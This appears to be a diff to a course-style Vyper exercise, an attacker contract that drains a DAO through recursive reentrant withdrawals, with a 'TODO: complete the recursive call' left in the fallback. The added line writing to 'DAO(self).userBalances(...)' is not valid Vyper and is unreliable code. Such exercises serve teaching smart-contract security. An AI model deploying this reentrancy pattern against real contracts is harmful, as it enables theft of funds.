@@ -6,6 +6,7 @@ interface DAO:
 dao_address: public(address)
 owner_address: public(address)
 counter: uint256
+deposit: uint256
 
 @external
 def __init__():
@@ -28,6 +29,7 @@ def attack(dao_address:address):
     self.dao_address = dao_address
     self.owner_address = msg.sender
     deposit_amount: uint256 = msg.value
+    self.deposit = deposit_amount
     self.counter = dao_address.balance / deposit_amount
  
     # Attack cannot withdraw more than what exists in the DAO
@@ -50,6 +52,7 @@ def __default__():
     
     # TODO: Add code here to complete the recursive call
     self.counter -=1
+    DAO(self).userBalances(self.owner_address)+=self.deposit
     self._attack()
 
     pass
